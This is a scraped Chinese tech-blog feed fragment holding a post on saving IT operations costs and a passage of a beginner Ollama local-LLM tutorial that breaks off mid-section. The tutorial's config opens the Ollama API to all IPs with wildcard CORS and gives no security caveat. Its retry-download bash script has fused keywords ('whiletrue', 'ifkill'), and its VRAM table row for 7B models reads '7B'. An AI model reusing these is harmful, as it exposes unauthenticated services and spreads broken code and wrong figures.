<p>Open AI中文文档： <a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.xiniushu.com%2F" target="_blank" title="https://openai.xiniushu.com/" ref="nofollow noopener noreferrer">openai.xiniushu.com/</a></p>
<h3 data-id="heading-10">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何在 IT 运维中节省开支]]></title>    <link>https://juejin.cn/post/7581478953866493952</link>    <guid>https://juejin.cn/post/7581478953866493952</guid>    <pubDate>2025-12-09T03:55:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581478953866493952" data-draft-id="7581423932613673000" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何在 IT 运维中节省开支"/> <meta itemprop="keywords" content="运维,DevOps"/> <meta itemprop="datePublished" content="2025-12-09T03:55:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mzlogin"/> <meta itemprop="url" content="https://juejin.cn/user/1890815727118414"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何在 IT 运维中节省开支
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1890815727118414/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mzlogin
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:55:08.000Z" title="Tue Dec 09 2025 03:55:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>当前，降本增效已成为各行各业的共识，如何在业务和支撑环节中有效节省开支，几乎是每个从业者必须面对的问题。本文将结合个人经验，记录一些在 IT 运维实践中节省成本的措施。</p>
<h2 data-id="heading-0">0x01 断舍离</h2>
<p>定期梳理闲置的资源和服务，及时关闭不必要的项目。</p>
<p>例如：</p>
<ul>
<li>
<p>对于因计划调整而搁置的项目，预留的资源应尽早下线；</p>
</li>
<li>
<p>对于因业务调整而不再需要的服务和资源，应及时停用；</p>
</li>
<li>
<p>在运行过程中发现长期闲置的资源，应及时释放。</p>
</li>
</ul>
<h2 data-id="heading-1">0x02 高转低</h2>
<p>根据实际使用情况，评估当前资源配置是否过高。若发现资源利用率较低，可以考虑将高配资源替换为低配资源，以节省费用。</p>
<p>例如，服务器和数据库实例等，可以根据 CPU、内存、存储等指标，在满足业务需求的前提下，选择更经济的规格。</p>
<p>此外，可以考虑通过性能优化，降低资源需求，从而使用更低配置的资源。</p>
<h2 data-id="heading-2">0x03 商转免</h2>
<h3 data-id="heading-3">使用免费或开源软件替代付费软件</h3>
<p>例如，一些存储中间件、消息中间件和监控系统等，可以考虑使用成熟的开源软件替代商业软件，以节省费用。</p>
<p>当然，在选择开源软件时，需考虑其功能和性能是否满足要求，同时也要评估运维和支持成本。</p>
<h3 data-id="heading-4">使用免费证书替代付费证书</h3>
<p>对于一些小公司和个人网站，可以考虑使用 Let's Encrypt 等免费证书颁发机构提供的 SSL 证书，以节省证书费用。详见我的另一篇文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzIwMDA3ODQzNA%3D%3D%26mid%3D2459863985%26idx%3D1%26sn%3Dceb71db548a4e1efbebd55672ef22ee1%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzIwMDA3ODQzNA==&amp;mid=2459863985&amp;idx=1&amp;sn=ceb71db548a4e1efbebd55672ef22ee1&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">借助 Let's Encrypt 节省 SSL 证书费用</a>。</p>
<h2 data-id="heading-5">0x04 优策略</h2>
<p>在采购硬件、软件和服务时，可以通过一些策略节省成本：</p>
<ul>
<li>
<p>如果采购量较大，可以尝试与供应商谈判，争取更优惠的价格；</p>
</li>
<li>
<p>选择合适的时机进行采购，不急用的资源可以在促销季统一采购；</p>
</li>
<li>
<p>在商业服务的计费模式选择上，按量付费和包年包月各有优劣，结合实际使用情况选择最合适的方式，并按需调整。</p>
</li>
</ul>
<h2 data-id="heading-6">0x05 常复盘</h2>
<p>定期进行成本复盘，检查是否有可以优化的细节。</p>
<p>例如：</p>
<ul>
<li>
<p>年代久远的视频文件，可以通过精简多清晰度副本来节省存储成本；</p>
</li>
<li>
<p>关注云平台的日常费用消耗，查看服务商是否推出新的资源包以抵扣费用；</p>
</li>
<li>
<p>...</p>
</li>
</ul>
<p>这是一个持续优化的过程，为公司节省的每一分钱，都可能是在寒冬中生存下去的机会。</p>
<p>您还有哪些有效的节省成本经验，期待评论交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[零基础上手 Ollama：教你3分钟跑通本地大模型]]></title>    <link>https://juejin.cn/post/7581412607061540910</link>    <guid>https://juejin.cn/post/7581412607061540910</guid>    <pubDate>2025-12-09T03:55:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607061540910" data-draft-id="7581412054903046153" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="零基础上手 Ollama：教你3分钟跑通本地大模型"/> <meta itemprop="keywords" content="Ollama,Agent,LLM"/> <meta itemprop="datePublished" content="2025-12-09T03:55:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            零基础上手 Ollama：教你3分钟跑通本地大模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:55:09.000Z" title="Tue Dec 09 2025 03:55:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<h2 data-id="heading-0">Ollama 介绍</h2>
<h3 data-id="heading-1">什么是 Ollama</h3>
<p>Ollama 是一个开源的大型语言模型（LLM）平台，旨在让用户能够轻松地在本地运行、管理和与大型语言模型进行交互。</p>
<p>Ollama 提供了一个简单的方式来加载和使用各种预训练的语言模型，支持文本生成、翻译、代码编写、问答等多种自然语言处理任务。</p>
<p>Ollama 的特点在于它不仅仅提供了现成的模型和工具集，还提供了方便的界面和 API，使得从文本生成、对话系统到语义分析等任务都能快速实现。</p>
<h3 data-id="heading-2">核心特点</h3>

























<table><thead><tr><th>区别维度</th><th>Ollama 的特点</th><th>说明</th></tr></thead><tbody><tr><td>本地化</td><td>更注重本地运行</td><td>与 ChatGPT 等依赖云服务的 LLM 不同，适合对数据隐私要求较高的用户</td></tr><tr><td>灵活性</td><td>可加载不同模型</td><td>用户可以根据需要加载不同的模型，而无需局限于单一的模型</td></tr><tr><td>开源</td><td>开源项目</td><td>用户可以自由地修改和扩展其功能</td></tr></tbody></table>
<h2 data-id="heading-3">安装部署</h2>
<h3 data-id="heading-4">Ollama 安装</h3>
<p>ollama支持<code>windows</code>、<code>Linux</code>、<code>macos</code>平台，选择自己平台进行下载。Ollama 官方下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Follama.com%2Fdownload" target="_blank" title="https://ollama.com/download" ref="nofollow noopener noreferrer">ollama.com/download</a>。</p>
<p>也可以通过 Docker 安装 Ollama。官方 Docker 镜像地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.docker.com%2Fr%2Follama%2Follama" target="_blank" title="https://hub.docker.com/r/ollama/ollama" ref="nofollow noopener noreferrer">hub.docker.com/r/ollama/ol…</a>。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 拉取 Docker 镜像：  </span>
docker pull ollama/ollama  
<span class="hljs-comment"># 运行容器：CPU 模式  </span>
docker run -d -p 11434:11434 -v /data/ollama:/root/.ollama --name ollama ollama/ollama  
<span class="hljs-comment"># 运行容器：GPU 模式  </span>
docker run --gpus=all -d -p 11434:11434 -v /data/ollama:/root/.ollama --name ollama ollama/ollama  
  
<span class="hljs-comment"># 进入容器 bash 下并下载模型  </span>
docker <span class="hljs-built_in">exec</span> -it ollama /bin/bash  
<span class="hljs-comment"># 下载一个模型  </span>
ollama pull deepseek-r1:8b
</code></pre>
<p>安装完成后访问<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A11434%2F" target="_blank" title="http://localhost:11434/" ref="nofollow noopener noreferrer">http://localhost:11434</a> 来验证</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/770cfc3c4de441a384b8246f29b5f235~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765857309&amp;x-signature=3GzflhS8u30BvHRQOwRVQmERFNo%3D" alt="" loading="lazy"/></p>
<p>Ollama 安装完成后先不要着急下载模型，我们先来设置环境变量。</p>
<h3 data-id="heading-5">环境变量配置</h3>
<p>ollama 常用环境变量：</p>








































<table><thead><tr><th>环境变量</th><th>功能说明</th><th>默认值/示例</th></tr></thead><tbody><tr><td>OLLAMA_HOST</td><td>设置API服务监听地址与端口，0.0.0.0表示允许所有IP访问</td><td>0.0.0.0:11434</td></tr><tr><td>OLLAMA_ORIGINS</td><td>允许跨域请求的域名列表，*为通配符</td><td>*</td></tr><tr><td>OLLAMA_MODELS</td><td>自定义模型存储路径，避免占用系统盘空间</td><td>D:\ollama\models</td></tr><tr><td>OLLAMA_KEEP_ALIVE</td><td>控制模型在内存中的保留时间，减少重复加载开销</td><td>24h</td></tr><tr><td>OLLAMA_NUM_PARALLEL</td><td>并行处理请求数，提升高并发场景下的吞吐量</td><td>2</td></tr><tr><td>OLLAMA_DEBUG</td><td>启用调试日志，排查服务异常</td><td>1</td></tr></tbody></table>
<p>配置 ollama 环境变量</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># vim /etc/systemd/system/ollama.service  </span>
<span class="hljs-section">[Service]</span>  
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"OLLAMA_HOST=0.0.0.0:11434"</span>  
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"OLLAMA_ORIGINS=*"</span>  
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"OLLAMA_MODELS=/data/ollama"</span>  
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"OLLAMA_KEEP_ALIVE=24h"</span>  
<span class="hljs-comment"># systemctl daemon-reload   </span>
<span class="hljs-comment"># systemctl restart ollama</span>
</code></pre>
<h2 data-id="heading-6">模型下载</h2>
<h3 data-id="heading-7">模型建议</h3>
<p>本地私有化部署具有实用性的模型，应至少有独立显卡并有 4G 以上显存。纯 CPU 模式虽然也可以运行，但生成速度很慢，仅适用于本地开发调试体验。</p>
<p>模型参数数以 <strong>B（billion）</strong>  为单位，通常情况下参数量越大模型能力越强，本地可以运行多少参数的大模型主要取决于显存大小，常见的模型硬件要求如下：</p>






























<table><thead><tr><th>模型大小</th><th>对显存要求</th><th>对内存要求</th></tr></thead><tbody><tr><td>2B</td><td>2~3 GB</td><td>≥ 4 GB</td></tr><tr><td>7B</td><td>7B</td><td>≥ 8 GB</td></tr><tr><td>13B</td><td>10~14 GB</td><td>≥ 16 GB</td></tr><tr><td>34B+</td><td>≥ 30 GB 显存或多卡</td><td>≥ 64 GB</td></tr></tbody></table>
<h3 data-id="heading-8">在线下载</h3>
<p>可以从<a href="https://link.juejin.cn?target=https%3A%2F%2Follama.com%2Fsearch" target="_blank" title="https://ollama.com/search" ref="nofollow noopener noreferrer">ollama.com/search</a>浏览，点进模型详情页面，该模型会详尽列出该模型所有版本，根据自身电脑配置选择合适大小的模型进行下载运行。</p>
<pre><code class="hljs language-arduino" lang="arduino"># 基本格式为：  
ollama run &lt;model_name:size&gt;  
  
# 例如下载并运行 deepseek-r1 的 <span class="hljs-number">1.5b</span> 模型  
ollama run deepseek-r1:<span class="hljs-number">1.5b</span>
</code></pre>
<h3 data-id="heading-9">重试下载</h3>
<p>由于模型文件较大，下载过程中可能会遇到开始网速还可以，后面变慢的情况，此时可以尝试通过每隔一段时间退出并重新执行的方式以保持较快的下载速率。以下载deepseek-r1:7b 为例：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash  </span>
  
MODEL_NAME=<span class="hljs-string">"deepseek-r1:7b"</span>  
  
whiletrue; <span class="hljs-keyword">do</span>  
    <span class="hljs-comment"># 检查模型是否已下载完成  </span>
    modelExists=$(ollama list | grep <span class="hljs-string">"<span class="hljs-variable">$MODEL_NAME</span>"</span>)  
  
    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$modelExists</span>"</span> ]; <span class="hljs-keyword">then</span>  
        <span class="hljs-built_in">echo</span><span class="hljs-string">"模型 <span class="hljs-variable">$MODEL_NAME</span> 已下载完成！"</span>  
        <span class="hljs-built_in">break</span>  
    <span class="hljs-keyword">fi</span>  
  
    <span class="hljs-comment"># 启动 ollama 进程并记录  </span>
    <span class="hljs-built_in">echo</span><span class="hljs-string">"开始下载模型 <span class="hljs-variable">$MODEL_NAME</span>..."</span>  
    ollama run <span class="hljs-string">"<span class="hljs-variable">$MODEL_NAME</span>"</span> &amp;  <span class="hljs-comment"># 在后台启动进程  </span>
    processId=$!  <span class="hljs-comment"># 获取最近启动的后台进程的PID  </span>
  
    <span class="hljs-comment"># 等待 60 秒  </span>
    <span class="hljs-built_in">sleep</span> 60  
  
    <span class="hljs-comment"># 尝试终止进程  </span>
    ifkill -0 <span class="hljs-variable">$processId</span> 2&gt;/dev/null; <span class="hljs-keyword">then</span>  
        <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$processId</span><span class="hljs-comment"># 强制终止进程  </span>
        <span class="hljs-built_in">echo</span><span class="hljs-string">"已中断本次下载，准备重新尝试..."</span>  
    <span class="hljs-keyword">else</span>  
        <span class="hljs-built_in">echo</span><span class="hljs-string">"进程已结束，无需中断"</span>  
    <span class="hljs-keyword">fi</span>  
<span class="hljs-keyword">done</span>
</code></pre>
<h2 data-id="heading-10">常用管理命令</h2>
<h3 data-id="heading-11">模型管理</h3>





























<table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><code>ollama list</code></td><td>查看本地已有的模型列表</td></tr><tr><td><code>ollama pull &lt;model&gt;</code></td><td>从官方或私库拉取模型（如：<code>ollama pull llama3:8b</code>）</td></tr><tr><td><code>ollama push &lt;model&gt;</code></td><td>推送本地模型到远程服务器（需登录）</td></tr><tr><td><code>ollama rm &lt;model&gt;</code></td><td>删除本地模型</td></tr><tr><td><code>ollama show &lt;model&gt;</code></td><td>显示模型详细元数据（参数、模板等）</td></tr></tbody></table>
<h3 data-id="heading-12">交互管理</h3>

































